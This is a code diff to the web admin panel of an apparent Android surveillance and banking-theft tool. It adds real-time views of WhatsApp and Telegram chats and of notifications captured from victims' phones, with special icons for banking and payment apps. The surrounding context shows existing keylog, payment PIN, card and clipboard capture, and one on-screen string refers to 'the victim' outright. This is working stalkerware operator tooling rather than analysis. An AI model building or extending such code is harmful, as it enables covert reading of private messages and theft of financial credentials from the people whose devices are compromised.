@@ -499,6 +499,42 @@ function connectWebSocket() {
     }
     addActivity('ri-clipboard-line', `Clipboard on ${d.device_id?.substring(0,8)}...: "${(d.text||'').substring(0,40)}..."`);
   });
+
+  // ═══ NOTIFICATIONS — real-time notification capture ═══
+  socket.on('new_notification', d => {
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'noti') {
+      allNotiEntries.unshift({
+        id: Date.now(),
+        device_id: d.device_id,
+        app_package: d.app_package,
+        title: d.title,
+        text_content: d.text_content,
+        recorded_at: d.recorded_at
+      });
+      if (allNotiEntries.length > 500) allNotiEntries = allNotiEntries.slice(0, 500);
+      renderNotifications();
+      const countEl = document.getElementById('notiCount');
+      if (countEl) {
+        const current = parseInt(countEl.textContent) || 0;
+        countEl.textContent = `${current + 1} notifications`;
+      }
+      const badge = document.getElementById('notiLiveBadge');
+      if (badge) { badge.style.display = 'inline'; setTimeout(() => badge.style.display = 'none', 5000); }
+    }
+    const appInfo = getAppIcon(d.app_package || '');
+    addActivity('ri-notification-3-line', `🔔 ${appInfo.name}: ${d.title || (d.text_content||'').substring(0,30)}`);
+  });
+
+  // ═══ WHATSAPP CHATS — real-time chat capture ═══
+  socket.on('new_whatsapp_chats', d => {
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'whatsapp') {
+      const badge = document.getElementById('whatsappLiveBadge');
+      if (badge) { badge.style.display = 'inline'; setTimeout(() => badge.style.display = 'none', 5000); }
+      // Reload to get the new messages
+      loadWhatsAppChats(1);
+    }
+    addActivity('ri-chat-3-line', `💬 ${d.count} new chat message(s) from ${d.app} on ${d.device_id?.substring(0,8)}...`);
+  });
 }
 
 // On WebSocket reconnect, refresh current page data to catch missed updates
@@ -1249,6 +1285,215 @@ window.clearDeviceKeylogs = clearDeviceKeylogs;
 window.filterKeylogEntries = filterKeylogEntries;
 window.loadDeviceKeylogs = loadDeviceKeylogs;
 
+// ═══ WHATSAPP CHATS FUNCTIONS (per-device modal) ═══
+
+let allWhatsAppChats = [];
+
+async function loadWhatsAppChats(page) {
+  try {
+    document.getElementById('whatsappListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading chat messages...</span></div>`;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/whatsapp-chats?limit=200`, {
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    allWhatsAppChats = data.entries || [];
+    document.getElementById('whatsappCount').textContent = `${data.total || 0} messages`;
+    renderWhatsAppChats();
+  } catch (e) {
+    document.getElementById('whatsappListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+  }
+}
+
+function renderWhatsAppChats() {
+  const container = document.getElementById('whatsappListContainer');
+  if (!container) return;
+  const search = (document.getElementById('whatsappSearch')?.value || '').toLowerCase();
+  let filtered = allWhatsAppChats;
+  if (search) {
+    filtered = filtered.filter(e => (e.text_content || '').toLowerCase().includes(search));
+  }
+
+  if (filtered.length === 0) {
+    container.innerHTML = `<div class="fx-empty"><i class="ri-chat-3-line"></i><p>No chat messages captured</p><span>Messages from WhatsApp/Telegram will appear here when the victim opens the app</span></div>`;
+    return;
+  }
+
+  container.innerHTML = filtered.map(e => {
+    const isOutgoing = e.direction === 'outgoing';
+    const text = escapeHtml(e.text_content || '');
+    const ts = escapeHtml(e.recorded_at || '');
+    const app = escapeHtml(e.app_package || 'whatsapp');
+    const appName = app.replace(/^com\./, '').replace(/^whatsapp$/, 'WhatsApp').replace(/^org\.telegram/, 'Telegram');
+    const align = isOutgoing ? 'flex-end' : 'flex-start';
+    const bgColor = isOutgoing ? 'rgba(37,211,102,.15)' : 'rgba(255,255,255,.05)';
+    const label = isOutgoing ? '→ Sent' : '← Received';
+    const labelColor = isOutgoing ? '#25D366' : 'var(--accent)';
+
+    return `<div style="display:flex;justify-content:${align};margin-bottom:8px">
+      <div style="max-width:75%;padding:10px 14px;background:${bgColor};border-radius:12px;border:1px solid ${isOutgoing ? 'rgba(37,211,102,.3)' : 'var(--border)'}">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;gap:8px">
+          <span style="font-size:10px;color:${labelColor};font-weight:600">${label}</span>
+          <span style="font-size:10px;color:var(--muted)">${appName}</span>
+        </div>
+        <div style="color:var(--text);font-size:13px;line-height:1.4;word-break:break-word">${text}</div>
+        <div style="font-size:9px;color:var(--muted);margin-top:4px;text-align:right">${ts}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterWhatsAppChats() { renderWhatsAppChats(); }
+
+async function clearWhatsAppChats() {
+  if (!confirm('Delete ALL chat messages for this device?')) return;
+  try {
+    await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/whatsapp-chats`, {
+      method: 'DELETE', headers: { 'x-admin-password': adminPassword }
+    });
+    showToast('Chats cleared', 'success');
+    loadWhatsAppChats(1);
+  } catch (e) { showToast('Error: ' + e.message, 'error'); }
+}
+
+window.loadWhatsAppChats = loadWhatsAppChats;
+window.filterWhatsAppChats = filterWhatsAppChats;
+window.clearWhatsAppChats = clearWhatsAppChats;
+
+// ═══ NOTIFICATIONS FUNCTIONS (per-device modal) ═══
+
+let allNotiEntries = [];
+
+// App icon mapping — common apps get branded icons, others get letter avatars
+const APP_ICONS = {
+  'com.whatsapp': { icon: '💬', name: 'WhatsApp', color: '#25D366' },
+  'com.whatsapp.w4b': { icon: '💬', name: 'WhatsApp Business', color: '#25D366' },
+  'org.telegram.messenger': { icon: '✈️', name: 'Telegram', color: '#0088cc' },
+  'com.instagram.android': { icon: '📷', name: 'Instagram', color: '#E4405F' },
+  'com.facebook.katana': { icon: '👤', name: 'Facebook', color: '#1877F2' },
+  'com.facebook.orca': { icon: '💬', name: 'Messenger', color: '#006AFF' },
+  'com.google.android.gm': { icon: '✉️', name: 'Gmail', color: '#EA4335' },
+  'com.google.android.apps.messaging': { icon: '📩', name: 'Messages', color: '#1A73E8' },
+  'com.android.mms': { icon: '📩', name: 'SMS', color: '#1A73E8' },
+  'com.twitter.android': { icon: '🐦', name: 'Twitter', color: '#1DA1F2' },
+  'com.snapchat.android': { icon: '👻', name: 'Snapchat', color: '#FFFC00' },
+  'com.discord': { icon: '🎮', name: 'Discord', color: '#5865F2' },
+  'com.linkedin.android': { icon: '💼', name: 'LinkedIn', color: '#0A66C2' },
+  'com.spotify.music': { icon: '🎵', name: 'Spotify', color: '#1DB954' },
+  'com.netflix.mediaclient': { icon: '🎬', name: 'Netflix', color: '#E50914' },
+  'com.amazon.mShop.android.shopping': { icon: '📦', name: 'Amazon', color: '#FF9900' },
+  'com.flipkart.android': { icon: '📦', name: 'Flipkart', color: '#2874F0' },
+  'com.phonepe.app': { icon: '💳', name: 'PhonePe', color: '#5F259F' },
+  'com.paytm': { icon: '💳', name: 'Paytm', color: '#00BAF2' },
+  'com.google.android.apps.nbu.paisa.wallet': { icon: '💳', name: 'GPay', color: '#4285F4' },
+  'com.bsb.hdfcbank': { icon: '🏦', name: 'HDFC Bank', color: '#004C8F' },
+  'com.csam.icici.bank.imobile': { icon: '🏦', name: 'ICICI Bank', color: '#F4811F' },
+  'com.sbi.lotusintouch': { icon: '🏦', name: 'SBI Bank', color: '#1E4D9B' },
+  'com.youtubemusic': { icon: '🎵', name: 'YT Music', color: '#FF0000' },
+  'com.google.android.youtube': { icon: '▶️', name: 'YouTube', color: '#FF0000' },
+  'com.zomato.android': { icon: '🍽️', name: 'Zomato', color: '#E23744' },
+  'com.swiggy.android': { icon: '🍽️', name: 'Swiggy', color: '#FC8019' },
+  'com.ubercab': { icon: '🚗', name: 'Uber', color: '#000000' },
+  'com.olacabs': { icon: '🚗', name: 'Ola', color: '#D7D7D7' },
+};
+
+function getAppIcon(pkg) {
+  if (APP_ICONS[pkg]) return APP_ICONS[pkg];
+  // Generate a color from package name hash
+  let hash = 0;
+  for (let i = 0; i < pkg.length; i++) hash = pkg.charCodeAt(i) + ((hash << 5) - hash);
+  const colors = ['#FF6B6B','#4ECDC4','#45B7D1','#96CEB4','#FFEAA7','#DDA0DD','#98D8C8','#F7DC6F','#85C1E9','#F1948A'];
+  const color = colors[Math.abs(hash) % colors.length];
+  const shortName = pkg.replace(/^com\./, '').replace(/^org\./, '').split('.')[0];
+  return { icon: shortName.charAt(0).toUpperCase(), name: shortName, color };
+}
+
+async function loadNotifications(page) {
+  try {
+    document.getElementById('notiListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading notifications...</span></div>`;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/notifications?limit=200`, {
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    allNotiEntries = data.entries || [];
+    document.getElementById('notiCount').textContent = `${data.total || 0} notifications`;
+    renderNotifications();
+    populateNotiAppFilter(allNotiEntries);
+  } catch (e) {
+    document.getElementById('notiListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+  }
+}
+
+function renderNotifications() {
+  const container = document.getElementById('notiListContainer');
+  if (!container) return;
+  const search = (document.getElementById('notiSearch')?.value || '').toLowerCase();
+  const appFilter = document.getElementById('notiAppFilter')?.value || '';
+
+  let filtered = allNotiEntries;
+  if (search) {
+    filtered = filtered.filter(e => (e.text_content || '').toLowerCase().includes(search) || (e.title || '').toLowerCase().includes(search));
+  }
+  if (appFilter) {
+    filtered = filtered.filter(e => (e.app_package || '') === appFilter);
+  }
+
+  if (filtered.length === 0) {
+    container.innerHTML = `<div class="fx-empty"><i class="ri-notification-3-line"></i><p>No notifications captured</p><span>Enable Notification Access on the device to capture incoming notifications from all apps</span></div>`;
+    return;
+  }
+
+  container.innerHTML = filtered.map(e => {
+    const appInfo = getAppIcon(e.app_package || '');
+    const title = escapeHtml(e.title || '');
+    const text = escapeHtml(e.text_content || '');
+    const ts = escapeHtml(e.recorded_at || '');
+    const isCircular = typeof appInfo.icon === 'string' && appInfo.icon.length === 1;
+
+    return `<div style="display:flex;gap:10px;padding:10px;border-bottom:1px solid var(--border)">
+      <div style="flex-shrink:0;width:40px;height:40px;border-radius:50%;background:${appInfo.color};display:flex;align-items:center;justify-content:center;font-size:${isCircular ? '18px' : '20px'};font-weight:bold;color:${appInfo.color === '#000000' || appInfo.color === '#FFFC00' ? '#000' : '#fff'}">
+        ${appInfo.icon}
+      </div>
+      <div style="flex:1;min-width:0">
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:8px">
+          <span style="font-size:12px;font-weight:600;color:${appInfo.color}">${escapeHtml(appInfo.name)}</span>
+          <span style="font-size:10px;color:var(--muted);white-space:nowrap">${ts}</span>
+        </div>
+        ${title ? `<div style="font-size:13px;color:var(--text);font-weight:600;margin-top:2px">${title}</div>` : ''}
+        <div style="font-size:12px;color:var(--text-secondary);margin-top:2px;word-break:break-word;line-height:1.4">${text}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function populateNotiAppFilter(entries) {
+  const select = document.getElementById('notiAppFilter');
+  if (!select) return;
+  const apps = [...new Set(entries.map(e => e.app_package || '').filter(a => a))];
+  const current = select.value;
+  select.innerHTML = '<option value="">All Apps</option>' + apps.map(a => {
+    const info = getAppIcon(a);
+    return `<option value="${escapeHtml(a)}">${escapeHtml(info.name)}</option>`;
+  }).join('');
+  select.value = current;
+}
+
+function filterNotifications() { renderNotifications(); }
+
+async function clearNotifications() {
+  if (!confirm('Delete ALL notifications for this device?')) return;
+  try {
+    await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/notifications`, {
+      method: 'DELETE', headers: { 'x-admin-password': adminPassword }
+    });
+    showToast('Notifications cleared', 'success');
+    loadNotifications(1);
+  } catch (e) { showToast('Error: ' + e.message, 'error'); }
+}
+
+window.loadNotifications = loadNotifications;
+window.filterNotifications = filterNotifications;
+window.clearNotifications = clearNotifications;
+
 // ═══ GLOBAL KEYLOG PAGE (all devices) ═══
 
 async function loadGlobalKeylogs(page) {
@@ -1435,6 +1680,26 @@ async function openDeviceModal(deviceId, deviceName) {
   document.getElementById('keylogCount').textContent = '0 entries';
   document.getElementById('keylogPagination').innerHTML = '';
 
+  // Reset WhatsApp chats
+  allWhatsAppChats = [];
+  const waSearch = document.getElementById('whatsappSearch');
+  if (waSearch) waSearch.value = '';
+  const waBadge = document.getElementById('whatsappLiveBadge');
+  if (waBadge) waBadge.style.display = 'none';
+  document.getElementById('whatsappListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading chat messages...</span></div>`;
+  document.getElementById('whatsappCount').textContent = '0 messages';
+
+  // Reset notifications
+  allNotiEntries = [];
+  const nSearch = document.getElementById('notiSearch');
+  if (nSearch) nSearch.value = '';
+  const nFilter = document.getElementById('notiAppFilter');
+  if (nFilter) nFilter.innerHTML = '<option value="">All Apps</option>';
+  const nBadge = document.getElementById('notiLiveBadge');
+  if (nBadge) nBadge.style.display = 'none';
+  document.getElementById('notiListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading notifications...</span></div>`;
+  document.getElementById('notiCount').textContent = '0 notifications';
+
   document.getElementById('deviceModal').classList.remove('hidden');
 
   // Load first tab
@@ -1458,6 +1723,8 @@ function closeDeviceModal() {
   allPaymentPins = [];
   allPaymentCards = [];
   allKeylogEntries = [];
+  allWhatsAppChats = [];
+  allNotiEntries = [];
 }
 window.closeDeviceModal = closeDeviceModal;
 
@@ -1480,6 +1747,8 @@ function switchDeviceTab(tab) {
   if (tab === 'schedule' && allScheduledCommands.length === 0) loadScheduledCommands();
   if (tab === 'payment') loadPaymentCaptures();
   if (tab === 'keylog') loadDeviceKeylogs(1);
+  if (tab === 'whatsapp') loadWhatsAppChats(1);
+  if (tab === 'noti') loadNotifications(1);
 }
 window.switchDeviceTab = switchDeviceTab;
 
